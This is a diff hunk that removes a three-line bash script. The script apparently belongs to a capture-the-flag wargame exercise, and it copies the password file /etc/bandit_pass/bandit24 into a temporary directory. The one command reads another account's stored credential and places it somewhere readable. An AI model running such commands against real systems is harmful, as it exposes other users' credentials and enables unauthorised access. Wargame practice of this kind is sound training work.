@@ -1,3 +1,0 @@
-#!/bin/bash
-# mktemp -d
-cat /etc/bandit_pass/bandit24 > /tmp/#######/pass
